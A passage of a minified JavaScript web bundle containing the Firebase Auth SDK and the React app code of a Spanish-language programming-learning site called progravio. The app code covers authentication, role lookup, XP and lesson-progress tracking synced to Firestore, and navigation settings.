yo().importScripts=="function"}async function gM(){if(!navigator?.serviceWorker)return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function bM(){return navigator?.serviceWorker?.controller||null}function vM(){return cx()?self:null}const ux="firebaseLocalStorageDb",yM=1,Hp="firebaseLocalStorage",dx="fbase_key";class yu{constructor(e){this.request=e}toPromise(){return new Promise((e,t)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{t(this.request.error)})})}}function gm(a,e){return a.transaction([Hp],e?"readwrite":"readonly").objectStore(Hp)}function EM(){const a=indexedDB.deleteDatabase(ux);return new yu(a).toPromise()}function kg(){const a=indexedDB.open(ux,yM);return new Promise((e,t)=>{a.addEventListener("error",()=>{t(a.error)}),a.addEventListener("upgradeneeded",()=>{const o=a.result;try{o.createObjectStore(Hp,{keyPath:dx})}catch(r){t(r)}}),a.addEventListener("success",async()=>{const o=a.result;o.objectStoreNames.contains(Hp)?e(o):(o.close(),await EM(),e(await kg()))})})}async function R1(a,e,t){const o=gm(a,!0).put({[dx]:e,value:t});return new yu(o).toPromise()}async function SM(a,e){const t=gm(a,!1).get(e),o=await new yu(t).toPromise();return o===void 0?null:o.value}function L1(a,e){const t=gm(a,!0).delete(e);return new yu(t).toPromise()}const CM=800,AM=3;class px{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await kg(),this.db)}async _withRetries(e){let t=0;for(;;)try{const o=await this._openDb();return await e(o)}catch(o){if(t++>AM)throw o;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return cx()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=hm._getInstance(vM()),this.receiver._subscribe("keyChanged",async(e,t)=>({keyProcessed:(await this._poll()).includes(t.key)})),this.receiver._subscribe("ping",async(e,t)=>["keyChanged"])}async initializeSender(){if(this.activeServiceWorker=await gM(),!this.activeServiceWorker)return;this.sender=new fM(this.activeServiceWorker);const e=await this.sender._send("ping",{},800);e&&e[0]?.fulfilled&&e[0]?.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||bM()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await kg();return await R1(e,Fp,"1"),await L1(e,Fp),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,t){return this._withPendingWrite(async()=>(await this._withRetries(o=>R1(o,e,t)),this.localCache[e]=t,this.notifyServiceWorker(e)))}async _get(e){const t=await this._withRetries(o=>SM(o,e));return this.localCache[e]=t,t}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(t=>L1(t,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(r=>{const l=gm(r,!1).getAll();return new yu(l).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const t=[],o=new Set;if(e.length!==0)for(const{fbase_key:r,value:l}of e)o.add(r),JSON.stringify(this.localCache[r])!==JSON.stringify(l)&&(this.notifyListeners(r,l),t.push(r));for(const r of Object.keys(this.localCache))this.localCache[r]&&!o.has(r)&&(this.notifyListeners(r,null),t.push(r));return t}notifyListeners(e,t){this.localCache[e]=t;const o=this.listeners[e];if(o)for(const r of Array.from(o))r(t)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),CM)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,t){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}px.type="LOCAL";const TM=px;new gu(3e4,6e4);function mx(a,e){return e?Wo(e):(De(a._popupRedirectResolver,a,"argument-error"),a._popupRedirectResolver)}class Vb extends Ob{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return el(e,this._buildIdpRequest())}_linkToIdToken(e,t){return el(e,this._buildIdpRequest(t))}_getReauthenticationResolver(e){return el(e,this._buildIdpRequest())}_buildIdpRequest(e){const t={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(t.idToken=e),t}}function xM(a){return nx(a.auth,new Vb(a),a.bypassAuthState)}function jM(a){const{auth:e,user:t}=a;return De(t,e,"internal-error"),tM(t,new Vb(a),a.bypassAuthState)}async function PM(a){const{auth:e,user:t}=a;return De(t,e,"internal-error"),aM(t,new Vb(a),a.bypassAuthState)}class fx{constructor(e,t,o,r,l=!1){this.auth=e,this.resolver=o,this.user=r,this.bypassAuthState=l,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(t)?t:[t]}execute(){return new Promise(async(e,t)=>{this.pendingPromise={resolve:e,reject:t};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(o){this.reject(o)}})}async onAuthEvent(e){const{urlResponse:t,sessionId:o,postBody:r,tenantId:l,error:c,type:d}=e;if(c){this.reject(c);return}const f={auth:this.auth,requestUri:t,sessionId:o,tenantId:l||void 0,postBody:r||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(d)(f))}catch(p){this.reject(p)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return xM;case"linkViaPopup":case"linkViaRedirect":return PM;case"reauthViaPopup":case"reauthViaRedirect":return jM;default:En(this.auth,"internal-error")}}resolve(e){ai(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){ai(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}const qM=new gu(2e3,1e4);async function zh(a,e,t){if(Yt(a.app))return Promise.reject(Nn(a,"operation-not-supported-in-this-environment"));const o=nr(a);lw(a,e,Ub);const r=mx(o,t);return new Ur(o,"signInViaPopup",e,r).executeNotNull()}class Ur extends fx{constructor(e,t,o,r,l){super(e,t,r,l),this.provider=o,this.authWindow=null,this.pollId=null,Ur.currentPopupAction&&Ur.currentPopupAction.cancel(),Ur.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return De(e,this.auth,"internal-error"),e}async onExecution(){ai(this.filter.length===1,"Popup operations only handle one event");const e=Bb();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(t=>{this.reject(t)}),this.resolver._isIframeWebStorageSupported(this.auth,t=>{t||this.reject(Nn(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){return this.authWindow?.associatedEvent||null}cancel(){this.reject(Nn(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,Ur.currentPopupAction=null}pollUserCancellation(){const e=()=>{if(this.authWindow?.window?.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(Nn(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,qM.get())};e()}}Ur.currentPopupAction=null;const RM="pendingRedirect",vp=new Map;class LM extends fx{constructor(e,t,o=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],t,void 0,o),this.eventId=null}async execute(){let e=vp.get(this.auth._key());if(!e){try{const o=await IM(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(o)}catch(t){e=()=>Promise.reject(t)}vp.set(this.auth._key(),e)}return this.bypassAuthState||vp.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const t=await this.auth._redirectUserForId(e.eventId);if(t)return this.user=t,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function IM(a,e){const t=MM(e),o=wM(a);if(!await o._isAvailable())return!1;const r=await o._get(t)==="true";return await o._remove(t),r}function DM(a,e){vp.set(a._key(),e)}function wM(a){return Wo(a._redirectPersistence)}function MM(a){return bp(RM,a.config.apiKey,a.name)}async function _M(a,e,t=!1){if(Yt(a.app))return Promise.reject($o(a));const o=nr(a),r=mx(o,e),c=await new LM(o,r,t).execute();return c&&!t&&(delete c.user._redirectEventId,await o._persistUserIfCurrent(c.user),await o._setRedirectUser(null,e)),c}const kM=600*1e3;class NM{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let t=!1;return this.consumers.forEach(o=>{this.isEventForConsumer(e,o)&&(t=!0,this.sendToConsumer(e,o),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!OM(e)||(this.hasHandledPotentialRedirect=!0,t||(this.queuedRedirectEvent=e,t=!0)),t}sendToConsumer(e,t){if(e.error&&!hx(e)){const o=e.error.code?.split("auth/")[1]||"internal-error";t.onError(Nn(this.auth,o))}else t.onAuthEvent(e)}isEventForConsumer(e,t){const o=t.eventId===null||!!e.eventId&&e.eventId===t.eventId;return t.filter.includes(e.type)&&o}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=kM&&this.cachedEventUids.clear(),this.cachedEventUids.has(I1(e))}saveEventToCache(e){this.cachedEventUids.add(I1(e)),this.lastProcessedEventTime=Date.now()}}function I1(a){return[a.type,a.eventId,a.sessionId,a.tenantId].filter(e=>e).join("-")}function hx({type:a,error:e}){return a==="unknown"&&e?.code==="auth/no-auth-event"}function OM(a){switch(a.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return hx(a);default:return!1}}async function zM(a,e={}){return tr(a,"GET","/v1/projects",e)}const UM=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,BM=/^https?/;async function VM(a){if(a.config.emulator)return;const{authorizedDomains:e}=await zM(a);for(const t of e)try{if(FM(t))return}catch{}En(a,"unauthorized-domain")}function FM(a){const e=wg(),{protocol:t,hostname:o}=new URL(e);if(a.startsWith("chrome-extension://")){const c=new URL(a);return c.hostname===""&&o===""?t==="chrome-extension:"&&a.replace("chrome-extension://","")===e.replace("chrome-extension://",""):t==="chrome-extension:"&&c.hostname===o}if(!BM.test(t))return!1;if(UM.test(a))return o===a;const r=a.replace(/\./g,"\\.");return new RegExp("^(.+\\."+r+"|"+r+")$","i").test(o)}const HM=new gu(3e4,6e4);function D1(){const a=yo().___jsl;if(a?.H){for(const e of Object.keys(a.H))if(a.H[e].r=a.H[e].r||[],a.H[e].L=a.H[e].L||[],a.H[e].r=[...a.H[e].L],a.CP)for(let t=0;t<a.CP.length;t++)a.CP[t]=null}}function GM(a){return new Promise((e,t)=>{function o(){D1(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{D1(),t(Nn(a,"network-request-failed"))},timeout:HM.get()})}if(yo().gapi?.iframes?.Iframe)e(gapi.iframes.getContext());else if(yo().gapi?.load)o();else{const r=Nw("iframefcb");return yo()[r]=()=>{gapi.load?o():t(Nn(a,"network-request-failed"))},Z0(`${kw()}?onload=${r}`).catch(l=>t(l))}}).catch(e=>{throw yp=null,e})}let yp=null;function JM(a){return yp=yp||GM(a),yp}const QM=new gu(5e3,15e3),WM="__/auth/iframe",KM="emulator/auth/iframe",$M={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},YM=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function XM(a){const e=a.config;De(e.authDomain,a,"auth-domain-config-required");const t=e.emulator?_b(e,KM):`https://${a.config.authDomain}/${WM}`,o={apiKey:e.apiKey,appName:a.name,v:ul},r=YM.get(a.config.apiHost);r&&(o.eid=r);const l=a._getFrameworks();return l.length&&(o.fw=l.join(",")),`${t}?${uu(o).slice(1)}`}async function ZM(a){const e=await JM(a),t=yo().gapi;return De(t,a,"internal-error"),e.open({where:document.body,url:XM(a),messageHandlersFilter:t.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:$M,dontclear:!0},o=>new Promise(async(r,l)=>{await o.restyle({setHideOnLeave:!1});const c=Nn(a,"network-request-failed"),d=yo().setTimeout(()=>{l(c)},QM.get());function f(){yo().clearTimeout(d),r(o)}o.ping(f).then(f,()=>{l(c)})}))}const e_={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},a_=500,t_=600,n_="_blank",o_="http://localhost";class w1{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function i_(a,e,t,o=a_,r=t_){const l=Math.max((window.screen.availHeight-r)/2,0).toString(),c=Math.max((window.screen.availWidth-o)/2,0).toString();let d="";const f={...e_,width:o.toString(),height:r.toString(),top:l,left:c},p=Ct().toLowerCase();t&&(d=J0(p)?n_:t),H0(p)&&(e=e||o_,f.scrollbars="yes");const v=Object.entries(f).reduce((S,[A,R])=>`${S}${A}=${R},`,"");if(Pw(p)&&d!=="_self")return r_(e||"",d),new w1(null);const y=window.open(e||"",d,v);De(y,a,"popup-blocked");try{y.focus()}catch{}return new w1(y)}function r_(a,e){const t=document.createElement("a");t.href=a,t.target=e;const o=document.createEvent("MouseEvent");o.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),t.dispatchEvent(o)}const s_="__/auth/handler",l_="emulator/auth/handler",c_=encodeURIComponent("fac");async function M1(a,e,t,o,r,l){De(a.config.authDomain,a,"auth-domain-config-required"),De(a.config.apiKey,a,"invalid-api-key");const c={apiKey:a.config.apiKey,appName:a.name,authType:t,redirectUrl:o,v:ul,eventId:r};if(e instanceof Ub){e.setDefaultLanguage(a.languageCode),c.providerId=e.providerId||"",TR(e.getCustomParameters())||(c.customParameters=JSON.stringify(e.getCustomParameters()));for(const[v,y]of Object.entries({}))c[v]=y}if(e instanceof vu){const v=e.getScopes().filter(y=>y!=="");v.length>0&&(c.scopes=v.join(","))}a.tenantId&&(c.tid=a.tenantId);const d=c;for(const v of Object.keys(d))d[v]===void 0&&delete d[v];const f=await a._getAppCheckToken(),p=f?`#${c_}=${encodeURIComponent(f)}`:"";return`${u_(a)}?${uu(d).slice(1)}${p}`}function u_({config:a}){return a.emulator?_b(a,l_):`https://${a.authDomain}/${s_}`}const Uh="webStorageSupport";class d_{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=lx,this._completeRedirectFn=_M,this._overrideRedirectResult=DM}async _openPopup(e,t,o,r){ai(this.eventManagers[e._key()]?.manager,"_initialize() not called before _openPopup()");const l=await M1(e,t,o,wg(),r);return i_(e,l,Bb())}async _openRedirect(e,t,o,r){await this._originValidation(e);const l=await M1(e,t,o,wg(),r);return hM(l),new Promise(()=>{})}_initialize(e){const t=e._key();if(this.eventManagers[t]){const{manager:r,promise:l}=this.eventManagers[t];return r?Promise.resolve(r):(ai(l,"If manager is not set, promise should be"),l)}const o=this.initAndGetManager(e);return this.eventManagers[t]={promise:o},o.catch(()=>{delete this.eventManagers[t]}),o}async initAndGetManager(e){const t=await ZM(e),o=new NM(e);return t.register("authEvent",r=>(De(r?.authEvent,e,"invalid-auth-event"),{status:o.onEvent(r.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:o},this.iframes[e._key()]=t,o}_isIframeWebStorageSupported(e,t){this.iframes[e._key()].send(Uh,{type:Uh},r=>{const l=r?.[0]?.[Uh];l!==void 0&&t(!!l),En(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const t=e._key();return this.originValidationPromises[t]||(this.originValidationPromises[t]=VM(e)),this.originValidationPromises[t]}get _shouldInitProactively(){return Y0()||G0()||Nb()}}const p_=d_;var _1="@firebase/auth",k1="1.12.0";class m_{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){return this.assertAuthConfigured(),this.auth.currentUser?.uid||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const t=this.auth.onIdTokenChanged(o=>{e(o?.stsTokenManager.accessToken||null)});this.internalListeners.set(e,t),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const t=this.internalListeners.get(e);t&&(this.internalListeners.delete(e),t(),this.updateProactiveRefresh())}assertAuthConfigured(){De(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}function f_(a){switch(a){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function h_(a){tl(new Hr("auth",(e,{options:t})=>{const o=e.getProvider("app").getImmediate(),r=e.getProvider("heartbeat"),l=e.getProvider("app-check-internal"),{apiKey:c,authDomain:d}=o.options;De(c&&!c.includes(":"),"invalid-api-key",{appName:o.name});const f={apiKey:c,authDomain:d,clientPlatform:a,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:X0(a)},p=new ww(o,r,l,f);return Fw(p,t),p},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,t,o)=>{e.getProvider("auth-internal").initialize()})),tl(new Hr("auth-internal",e=>{const t=nr(e.getProvider("auth").getImmediate());return(o=>new m_(o))(t)},"PRIVATE").setInstantiationMode("EXPLICIT")),Gi(_1,k1,f_(a)),Gi(_1,k1,"esm2020")}const g_=300,b_=KA("authIdTokenMaxAge")||g_;let N1=null;const v_=a=>async e=>{const t=e&&await e.getIdTokenResult(),o=t&&(new Date().getTime()-Date.parse(t.issuedAtTime))/1e3;if(o&&o>b_)return;const r=t?.token;N1!==r&&(N1=r,await fetch(a,{method:r?"POST":"DELETE",headers:r?{Authorization:`Bearer ${r}`}:{}}))};function y_(a=aT()){const e=nb(a,"auth");if(e.isInitialized())return e.getImmediate();const t=Vw(a,{popupRedirectResolver:p_,persistence:[TM,pM,lx]}),o=KA("authTokenSyncURL");if(o&&typeof isSecureContext=="boolean"&&isSecureContext){const l=new URL(o,location.origin);if(location.origin===l.origin){const c=v_(l.toString());sM(t,c,()=>c(t.currentUser)),rM(t,d=>c(d))}}const r=QA("auth");return r&&Hw(t,`http://${r}`),t}function E_(){return document.getElementsByTagName("head")?.[0]??document}Mw({loadJS(a){return new Promise((e,t)=>{const o=document.createElement("script");o.setAttribute("src",a),o.onload=e,o.onerror=r=>{const l=Nn("internal-error");l.customData=r,t(l)},o.type="text/javascript",o.charset="UTF-8",E_().appendChild(o)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});h_("Browser");const S_={apiKey:"AIzaSyA6SMzxjXsoc29q6hpZBYn6GbXvAtIZ3Iw",authDomain:"progravio.firebaseapp.com",projectId:"progravio",storageBucket:"progravio.firebasestorage.app",messagingSenderId:"335869815234",appId:"1:335869815234:web:dd6cff208b0a8e5fecce5b",measurementId:"G-26LL944T3Z"},gx=eT(S_),kr=y_(gx),Gp=BD(gx),Fb=mt.createContext(void 0),C_=({children:a})=>{const[e,t]=F.useState(null),[o,r]=F.useState(null),[l,c]=F.useState(!0);F.useEffect(()=>{let A=null;const R=lM(kr,L=>{if(t(L),A&&(A(),A=null),L)try{A=_0(Np(Gp,"users",L.uid),x=>{if(x.exists()){const D=x.data().role||"user";r(G=>G==="admin"&&D==="user"?(console.log("AuthContext: Preventing downgrade from admin to user (Sticky Role)"),"admin"):D)}}),L.getIdToken().then(x=>{console.log("AuthContext: Fetching verified role from backend..."),fetch("https://progravio.onrender.com/users/me",{headers:{Authorization:`Bearer ${x}`}}).then(D=>{if(!D.ok)throw new Error(`HTTP error! status: ${D.status}`);return D.json()}).then(D=>{D.role&&(console.log("AuthContext: Backend verified role:",D.role),r(D.role))}).catch(D=>console.error("AuthContext: Backend verification failed:",D)).finally(()=>c(!1))})}catch(x){console.error("AuthContext: Error setting up listeners:",x),c(!1)}else r(null),c(!1)});return()=>{R(),A&&A()}},[]);const d=async(A,R)=>{await iM(kr,A,R)},f=async(A,R)=>{await oM(kr,A,R)},p=async()=>{await cM(kr)},v=async()=>{const A=new Go;await zh(kr,A)},y=async()=>{const A=new Ho;await zh(kr,A)},S=async()=>{const A=new Jo;await zh(kr,A)};return g.jsx(Fb.Provider,{value:{user:e,role:o,isAdmin:o==="admin",loading:l,login:d,register:f,logout:p,loginWithGoogle:v,loginWithFacebook:y,loginWithGithub:S},children:!l&&a})},or=()=>{const a=F.useContext(Fb);if(!a)throw new Error("useAuth must be used within an AuthProvider");return a},bx=F.createContext(void 0),O1="progravio_progress_v3",Bh={completed:{},checklist:{},favorites:{},lastLessons:{},history:[],xp:0,awardedBonuses:[],favoriteLibraries:[]},A_=({children:a})=>{const{user:e}=or(),[t,o]=F.useState(()=>{const B=localStorage.getItem(O1);if(!B)return Bh;try{const ee=JSON.parse(B);return{...Bh,...ee}}catch(ee){return console.error("Error parsing progress from localStorage",ee),Bh}}),[r,l]=F.useState(!1);F.useEffect(()=>{(async()=>{if(e){l(!0);try{const ee=Np(Gp,"users",e.uid),ue=await tw(ee);if(ue.exists()){const Q=ue.data(),w={completed:{...t.completed,...Q.completed},checklist:{...t.checklist,...Q.checklist},favorites:{...t.favorites,...Q.favorites},lastLessons:{...t.lastLessons,...Q.lastLessons||{}},history:Q.history||t.history,xp:Math.max(t.xp,Q.xp||0),awardedBonuses:Array.from(new Set([...t.awardedBonuses,...Q.awardedBonuses||[]])),favoriteLibraries:Array.from(new Set([...t.favoriteLibraries,...Q.favoriteLibraries||[]]))};o(w),await Nh(ee,w)}else(Object.keys(t.completed).length>0||t.xp>0)&&await Nh(ee,t,{merge:!0})}catch(ee){console.error("Error syncing with Firestore:",ee)}finally{l(!1)}}})()},[e?.uid]),F.useEffect(()=>{localStorage.setItem(O1,JSON.stringify(t));const ee=setTimeout(async()=>{if(e&&!r)try{await Nh(Np(Gp,"users",e.uid),t,{merge:!0})}catch(ue){console.error("Error saving to Firestore:",ue)}},1e3);return()=>clearTimeout(ee)},[t,e?.uid]);const c=B=>{if(B<100)return{level:1,nextLevelXp:100,currentLevelMin:0};if(B<250)return{level:2,nextLevelXp:250,currentLevelMin:100};if(B<500)return{level:3,nextLevelXp:500,currentLevelMin:250};const ee=Math.floor(B/250)+1;return{level:ee,nextLevelXp:ee*250,currentLevelMin:(ee-1)*250}},d=(B,ee,ue)=>{o(Q=>{if(Q.completed[B]?.[ee])return Q;const w={...Q.completed,[B]:{...Q.completed[B]||{},[ee]:!0}};let I=Q.xp+10;const k=[...Q.awardedBonuses];return Object.values(w[B]||{}).filter(Boolean).length===ue&&!k.includes(B)&&(I+=50,k.push(B)),{...Q,completed:w,xp:I,awardedBonuses:k}})},f=(B,ee)=>!!t.completed[B]?.[ee],p=(B,ee)=>{const ue=t.completed[B];if(!ue||ee===0)return 0;const Q=Object.values(ue).filter(Boolean).length;return Math.round(Q/ee*100)},v=(B,ee,ue)=>{o(Q=>{const w=Q.checklist[B]||{},I=w[ee]||[],k=I.includes(ue)?I.filter(j=>j!==ue):[...I,ue];return{...Q,checklist:{...Q.checklist,[B]:{...w,[ee]:k}}}})},y=(B,ee,ue)=>t.checklist[B]?.[ee]?.includes(ue)||!1,S=(B,ee,ue,Q)=>{o(w=>{const I={...w.favorites};return I[ee]?delete I[ee]:I[ee]={moduleId:B,lessonTitle:ue,moduleTitle:Q},{...w,favorites:I}})},A=B=>!!t.favorites[B],R=B=>{o(ee=>{const Q=ee.favoriteLibraries.includes(B)?ee.favoriteLibraries.filter(w=>w!==B):[...ee.favoriteLibraries,B];return{...ee,favoriteLibraries:Q}})},L=B=>t.favoriteLibraries.includes(B),x=(B,ee)=>{o(ue=>({...ue,lastLessons:{...ue.lastLessons,[B]:ee}}))},D=B=>t.lastLessons[B]||null,G=(B,ee,ue,Q)=>{o(w=>{const I={lessonId:B,moduleId:ee,lessonTitle:ue,moduleTitle:Q,timestamp:Date.now()},k=w.history.filter(_=>_.lessonId!==B),j=[I,...k].slice(0,20);return{...w,history:j}})};return g.jsx(bx.Provider,{value:{markAsCompleted:d,isLessonCompleted:f,getModuleProgress:p,toggleChecklistItem:v,isChecklistItemCompleted:y,toggleFavorite:S,isFavorite:A,calculateLevel:c,updateLastLesson:x,getLastLesson:D,addToHistory:G,history:t.history,favorites:t.favorites,xp:t.xp,syncing:r,favoriteLibraries:t.favoriteLibraries,toggleLibraryFavorite:R,isLibraryFavorite:L},children:a})},gl=()=>{const a=F.useContext(bx);if(!a)throw new Error("useProgress must be used within a ProgressProvider");return a},vx=F.createContext(void 0),T_=({children:a})=>{const{isAdmin:e}=or(),[t,o]=F.useState({}),[r,l]=F.useState(!0);F.useEffect(()=>{const d=Np(Gp,"settings","navigation"),f=_0(d,p=>{p.exists()?o(p.data()):o({"/roadmap":{enabled:!0,label:"Ruta"},"/libraries":{enabled:!0,label:"Bibliotecas"},"/cheatsheets":{enabled:!0,label:"Trucos"},"/projects":{enabled:!0,label:"Portfolio"},"/profile":{enabled:!0,label:"Perfil"},"/div-playground":{enabled:!0,label:"<div />"}}),l(!1)},p=>{console.error("Error listening to nav config:",p),l(!1)});return()=>f()},[]);const c=d=>{if(e)return!0;const f=t[d];return!(f&&f.enabled===!1)};return g.jsx(vx.Provider,{value:{navConfig:t,loading:r,isPathEnabled:c},children:a})},x_=()=>{const a=F.useContext(vx);if(!a)throw new Error("useNav must be used within a NavProvider");return a},j_=({isOpen:a,title:e,message:t,onClose:o,type:r="info"})=>a?g.jsx("div",{className:"modal-overlay",onClick:o,children:g.jsxs("div",{className:"modal-content",onClick:l=>l.stopPropagation(),children:[g.jsx("div",{className:`modal-header ${r}`,children:g.jsx("h3",{children:e||(r==="error"?"Error":"Aviso")})}),g.jsx("div",{className:"modal-body",children:g.jsx("p",{children:t})}),g.jsx("div",{className:"modal-footer",children:g.jsx("button",{className:"modal-btn",onClick:o,children:"Entendido"})})]})}):null,P_=F.createContext(void 0),q_=({children:a})=>{const[e,t]=F.useState({isOpen:!1,message:""}),o=(l,c)=>{t({isOpen:!0,message:l,title:c?.title,type:c?.type||"info"})},r=()=>{t(l=>({...l,isOpen:!1}))};return g.jsxs(P_.Provider,{value:{showAlert:o},children:[a,g.jsx(j_,{isOpen:e.isOpen,message:e.message,title:e.title,type:e.type,onClose:r})]})};var z1="popstate";function R_(a={}){function e(o,r){let{pathname:l,search:c,hash:d}=o.location;return Ng("",{pathname:l,search:c,hash:d},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(o,r){return typeof r=="string"?r:ru(r)}return I_(e,t,null,a)}function Ia(a,e){if(a===!1||a===null||typeof a>"u")throw new Error(e)}function zn(a,e){if(!a){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function L_(){return Math.random().toString(36).substring(2,10)}function U1(a,e){return{usr:a.state,key:a.key,idx:e}}function Ng(a,e,t=null,o){return{pathname:typeof a=="string"?a:a.pathname,search:"",hash:"",...typeof e=="string"?bl(e):e,state:t,key:e&&e.key||o||L_()}}function ru({pathname:a="/",search:e="",hash:t=""}){return e&&e!=="?"&&(a+=e.charAt(0)==="?"?e:"?"+e),t&&t!=="#"&&(a+=t.charAt(0)==="#"?t:"#"+t),a}function bl(a){let e={};if(a){let t=a.indexOf("#");t>=0&&(e.hash=a.substring(t),a=a.substring(0,t));let o=a.indexOf("?");o>=0&&(e.search=a.substring(o),a=a.substring(0,o)),a&&(e.pathname=a)}return e}function I_(a,e,t,o={}){let{window:r=document.defaultView,v5Compat:l=!1}=o,c=r.history,d="POP",f=null,p=v();p==null&&(p=0,c.replaceState({...c.state,idx:p},""));function v(){return(c.state||{idx:null}).idx}function y(){d="POP";let x=v(),D=x==null?null:x-p;p=x,f&&f({action:d,location:L.location,delta:D})}function S(x,D){d="PUSH";let G=Ng(L.location,x,D);p=v()+1;let B=U1(G,p),ee=L.createHref(G);try{c.pushState(B,"",ee)}catch(ue){if(ue instanceof DOMException&&ue.name==="DataCloneError")throw ue;r.location.assign(ee)}l&&f&&f({action:d,location:L.location,delta:1})}function A(x,D){d="REPLACE";let 